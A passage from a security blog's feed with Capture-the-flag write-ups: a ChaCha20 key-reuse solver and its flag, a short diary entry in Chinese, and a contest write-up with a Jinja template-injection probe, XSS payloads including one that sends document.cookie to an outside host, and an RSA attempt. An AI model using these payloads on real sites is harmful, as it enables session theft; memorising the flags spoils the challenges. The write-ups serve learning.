class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encryptMessage</span>(<span class="params">message, key, nonce</span>):</span><br><span class="line">    cipher = ChaCha20.new(key=key, nonce=iv)</span><br><span class="line">    ciphertext = cipher.encrypt(message)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeData</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    message = <span class="string">b&quot;Our counter agencies have intercepted your messages and a lot &quot;</span></span><br><span class="line">    message += <span class="string">b&quot;of your agent&#x27;s identities have been exposed. In a matter of &quot;</span></span><br><span class="line">    message += <span class="string">b&quot;days all of them will be captured&quot;</span></span><br><span class="line"></span><br><span class="line">    key, iv = os.urandom(<span class="number">32</span>), os.urandom(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    encrypted_message = encryptMessage(message, key, iv)</span><br><span class="line">    encrypted_flag = encryptMessage(FLAG, key, iv)</span><br><span class="line"></span><br><span class="line">    data = iv.<span class="built_in">hex</span>() + <span class="string">&quot;\n&quot;</span> + encrypted_message.<span class="built_in">hex</span>() + <span class="string">&quot;\n&quot;</span> + encrypted_flag.<span class="built_in">hex</span>()</span><br><span class="line">    writeData(data)</span><br></pre></td></tr></table></figure><p>Bingo, it’s a ChaCha20 encryption. <a href="https://en.wikipedia.org/wiki/ChaCha20-Poly1305">ChaCha20</a> is a stream cipher algorithm designed by Daniel J. Bernstein in 2008. It’s a variant of Salsa20 and often used in encrypted communication such as TLS &amp; VPN. The main concept of it is the XOR operation. Since it’s a type of XOR cipher, it has the following properties.</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right" columnspacing=""><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>K</mi><mi>e</mi><mi>y</mi><mo>=</mo><mi>C</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>C</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>=</mo><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>K</mi><mi>e</mi><mi>y</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>=</mo><mi>C</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>K</mi><mi>e</mi><mi>y</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}Key = Ciphertext \oplus Plaintext \\Ciphertext = Plaintext \oplus Key \\Plaintext = Ciphertext \oplus Key\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5em;vertical-align:-2em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Key</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">Pl</span><span class="mord mathnormal">ain</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">Pl</span><span class="mord mathnormal">ain</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">Key</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">Pl</span><span class="mord mathnormal">ain</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">Key</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>In this challenge, it <strong>reuses</strong> the key and the initial vector (iv), and it also tells us the message, which is the first plaintext, so we can calculate the key by doing XOR to the 1st cipher and the 1st plaintext (check the code and you’ll know why). And as long as we got the key, we can calculate the 2nd plaintext with the same key. So, let’s hack the planet!</p><h1 id="0x02-Exploit">0x02 Exploit</h1><p>To calculate the XOR value of two bytes, I use the function <code>xor</code> provided by <code>pwntools</code>. And below is my exploit. <strong>You can try it by yourself before checking out the script.</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">message = <span class="string">b&quot;Our counter agencies have intercepted your messages and a lot &quot;</span></span><br><span class="line">message += <span class="string">b&quot;of your agent&#x27;s identities have been exposed. In a matter of &quot;</span></span><br><span class="line">message += <span class="string">b&quot;days all of them will be captured&quot;</span></span><br><span class="line"></span><br><span class="line">cipher_1 = <span class="number">0x7AA34395A258F5893E3DB1822139B8C1F04CFAB9D757B9B9CCA57E1DF33D093F07C7F06E06BB6293676F9060A838EA138B6BC9F20B08AFEB73120506E2CE7B9B9DCD9E4A421584CFABA2481132DFBDF4216E98E3FACEC9BA199CA3A97641E9CA9782868D0222A1D7C0D3119B867EDAF2E72E2A6F7D344DF39A14EDC39CB6F960944DDAC2AAEF324827C36CBA67DCB76B22119B43881A3F1262752990</span></span><br><span class="line">cipher_1 = long_to_bytes(cipher_1)</span><br><span class="line">cipher_2 = <span class="number">0x7D8273CEB459E4D4386DF4E32E1AECC1AA7AAAFDA50CB982F6C62623CF6B29693D86B15457AA76AC7E2EEF6CF814AE3A8D39C7</span></span><br><span class="line">cipher_2 = long_to_bytes(cipher_2)</span><br><span class="line"></span><br><span class="line">key = xor(cipher_1, message)</span><br><span class="line">plaintext = xor(cipher_2, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><h1 id="0x03-Pwned">0x03 Pwned</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTB&#123;und3r57AnD1n9_57R3aM_C1PH3R5_15_51mPl3_a5_7Ha7&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> HackTheBox </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 11] 把SCIST季後賽的writeup整理了下</title>
      <link href="/posts/b5f171c7/"/>
      <url>/posts/b5f171c7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>這幾天把 SCIST 季後賽的 writeup 整理了下，17 號前要繳交。整理完之後還是一直很愧疚+自我懷疑。不知道是不是自己沒有這個天分還是努力的方向錯誤了。不過沒關係我還是會繼續保持熱愛，努力加油的！</p><h1 id="今日進度">今日進度</h1><ol><li><a href="https://cx330.tw/posts/9deb0a60/">SCIST S4 資訊安全季後賽 Writeup</a></li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>11：00</code></p></li><li><p>知識量：⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCIST S4 資訊安全季後賽 Writeup</title>
      <link href="/posts/9deb0a60/"/>
      <url>/posts/9deb0a60/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>終於到了 SCIST 課程結束後的季後賽。我知道我自己肯定還有很多不足的地方，不過依然是挺期待這次的比賽，希望可以再讓自己更進步點。不過沒想到居然只解出兩題…多多少少還是有點打擊自己的信心的。不知道是不是比較沒有天分，又或是說準備的方式有錯誤，總之就是對自己這種好像一直有在學習新知識但比賽卻都沒看見成效的狀態有點自責 + 受挫。不過還是先直接進 Writeup 看一下我的解題過程吧！</p><h1 id="0x01-Web">0x01 Web</h1><h2 id="formatter">formatter</h2><p>這題是一個文字的格式化器，說是格式化，他其實只是把兩邊加上貓貓 XD。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240714145845517.png" alt="題目"></p><p>如果你輸入了一些文字進去，他就會兩邊加上貓貓回傳回來。舉例來說，我先輸入<code>Test</code>然後點 Submit，就會出現<code>😺 Test 😺</code>。稍微查詢了一下後，發現這題可能是個伺服器模板注入（Server Side Template Injection, SSTI）。這種漏洞就是攻擊者把惡意的代碼注入伺服器端的模板並操控模板引擎執行那些惡意代碼。而這題好像也確實有這個漏洞的存在，因為當我們輸入</p><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> config[&quot;SECRET_KEY&quot;] %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;c&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure><p>他回傳的內容會是<code>😺 c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c 😺</code>，這長度看起來和 Flag 差不多（?）。到這邊，我就卡住了。這裡之所以只會輸出<code>c</code>是因為伺服器代碼中有針對使用者輸入做過濾和替換，會把相連且同向的兩個大括號和替換為空字元，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        rawtext = request.form.get(<span class="string">&quot;rawtext&quot;</span>)</span><br><span class="line">        mappings = &#123;<span class="string">&quot;&#123;&#123;&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;...&quot;</span>, <span class="string">&quot;(&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">for</span> mapping <span class="keyword">in</span> mappings:</span><br><span class="line">            rawtext = rawtext.replace(mapping, mappings[mapping])</span><br><span class="line">        rawtext = <span class="string">&quot;😺 &quot;</span> + rawtext + <span class="string">&quot; 😺&quot;</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(rawtext)</span><br></pre></td></tr></table></figure><p>到這邊卡住之後，我有看到題目的資料夾中還有另外一個資料夾，名稱叫做 notes。打開來看發現裡面都是一堆像是 XSS 的 Payload，舉幾個例子。</p><ul><li><code>&lt;svg/onload=alert(1)&gt;</code></li><li><code>&lt;svg/onload=fetch('http://dev.vincent55.tw:8787?a='+document.cookie)&gt;</code></li></ul><p>然後還有一個是 Rickroll 的連結 XD。所以到了這時候我就一直很疑惑為甚麼會出現這些 notes，是不是要提示我們這題是 XSS。結果就到了最後還是沒解出這題。</p><h1 id="0x02-Crypto">0x02 Crypto</h1><h2 id="Smoothie">Smoothie</h2><p>直接看題目吧，我把題目給的加密腳本跟密文 + 公鑰放在一起了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, isPrime, size</span><br><span class="line"><span class="keyword">from</span> Crypto.Random.random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG, SIZE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mango_a_go_go</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> size(p) &lt; SIZE:</span><br><span class="line">            p *= getPrime(randrange(<span class="number">2</span>, <span class="number">12</span>))</span><br><span class="line">        <span class="keyword">if</span> isPrime(p - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> p - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strawberries_wild</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> size(p) &lt; SIZE:</span><br><span class="line">            p *= getPrime(randrange(<span class="number">2</span>, <span class="number">12</span>))</span><br><span class="line">        <span class="keyword">if</span> isPrime(p + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> p + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">yogurt</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> getPrime(SIZE) ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    smoothie = strawberries_wild() * mango_a_go_go() * yogurt()</span><br><span class="line">    flag = bytes_to_long(FLAG.encode())</span><br><span class="line">    flag = <span class="built_in">pow</span>(flag, e, smoothie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag = <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;smoothie = <span class="subst">&#123;smoothie&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = 469221284029086826023747997560431390782361982638061257450599210708962645002102847975462660638193645789450754543161479618083250809660166042502944853280554224255633426448658481032615217773743807123912268129954755529085653283483845209697030918916368538410596291283961216415664601562539040139144815815020812381504</span></span><br><span class="line"><span class="comment"># smoothie = 697628240852435861833732827649361589992628854136683558886480614847121218068368409674997942839000556721079790078853783722095774006008786802855171763400576735341062935016809334479917656367316628949895516450621001020141725837414164848350808778574391917507635861296067849758069488027024995888841277834894925864271</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br></pre></td></tr></table></figure><p>看完之後應該會發現它就是個 RSA 的變形。原本 RSA 中的 n 在這裡叫做 smoothie，但是原本的 n 應該是由兩個大質數 p 跟 q 所相乘得到的，這題則是由兩個質數和另一個質數的平方相乘所得到的。其中兩個質數是由<code>mango_a_go_go()</code>和<code>strawberries_wild()</code>得到的，而另一個質數的平方則由<code>yogurt()</code>算得。</p><p>題目分析到這邊之後，我的思路是去找到歐拉函數 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ϕ</span></span></span></span> ，然後就可以正常用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d = e^{-1} \mod \phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> ，再用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m = c^{d} \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span> 就可以找到明文了。</p><p>我先用 <a href="http://factordb.com/">FactorDB</a> 找看看找不找的到他的分解因數，結果真的找到了。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240714153951733.png" alt="FactorDB"></p><p>但結果分解出來後竟然只有兩個質因數，雖然和腳本說的有四個質數（其中一個有平方）不一樣，我還是繼續嘗試下去了，我嘗試用這兩個因數去找到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ϕ</span></span></span></span> ，腳本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">flag = <span class="number">469221284029086826023747997560431390782361982638061257450599210708962645002102847975462660638193645789450754543161479618083250809660166042502944853280554224255633426448658481032615217773743807123912268129954755529085653283483845209697030918916368538410596291283961216415664601562539040139144815815020812381504</span></span><br><span class="line">smoothie = <span class="number">697628240852435861833732827649361589992628854136683558886480614847121218068368409674997942839000556721079790078853783722095774006008786802855171763400576735341062935016809334479917656367316628949895516450621001020141725837414164848350808778574391917507635861296067849758069488027024995888841277834894925864271</span></span><br><span class="line"></span><br><span class="line">c = flag</span><br><span class="line">n = smoothie</span><br><span class="line"></span><br><span class="line">f = FactorDB(n)</span><br><span class="line">f.connect()</span><br><span class="line">factors = f.get_factor_list()</span><br><span class="line"></span><br><span class="line">p = factors[<span class="number">0</span>]</span><br><span class="line">q = factors[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>解果輸出的東西不是正常的字符。如下。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\xcdB\x16Lp%\xce\xd94G\xcc&#125;G%l&#123;\x0c4!\xb5\xba\xb2&#123;Z\xee\xe0\xe2Aq7\x97\x10\xe2\xae\xb2\x9f\x05\x8c\xa5\xb4b4W\x12\xf8Z\xf9\x90w!&lt;\xb0\xd9l&lt;W&amp;\x1fi\xbe\x9aU\x91\xceB\x9f\x9c\x9a\xbd\x83y\xb1_b\x02\xd1f\x11\xb2\x0b\xbe\x03\x8c\xdb\x01\x10\xcb\xc1\x89v\xed*\xd0\x0e\x9be\x8b\xf7j\xc4\x06\x1b\x17t\xa7s=&lt;\x93\x9f8\x01kj\xc8\xb9\xb9\xcd\xb94\xbb\xee,\x02\xf2\xdd\x9e\x0f&#x27;</span><br></pre></td></tr></table></figure><p>然後這題最後也是沒有寫出來 🥲🥲。應該是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ϕ</span></span></span></span> 是錯誤的，畢竟他有四個數，和 FactorDB 分解的不一樣。等到時候別人的 Writeup 出來我再來研究一下解法。</p><h1 id="0x03-Reverse">0x03 Reverse</h1><h2 id="PeekMe">PeekMe</h2><p>這題給了一個 Binary 文件，我們先執行看看。發現他是一個很簡單的小程式，具體交互內容如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/SCIST/PeekMe]</span><br><span class="line">└─$ ./peekme</span><br><span class="line">1. Say hello.</span><br><span class="line">2. Say goodbye.</span><br><span class="line">3. Exit.</span><br><span class="line">1</span><br><span class="line">Hello!</span><br><span class="line">1. Say hello.</span><br><span class="line">2. Say goodbye.</span><br><span class="line">3. Exit.</span><br><span class="line">2</span><br><span class="line">Goodbye!</span><br><span class="line">1. Say hello.</span><br><span class="line">2. Say goodbye.</span><br><span class="line">3. Exit.</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>到這邊，我們大概知道這就是一個可以輸入選項然後有點小功能的東西。接著，既然是 Reverse 題我們就用 IDA 把他打開來看看吧。打開之後大概的內容我放在下面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 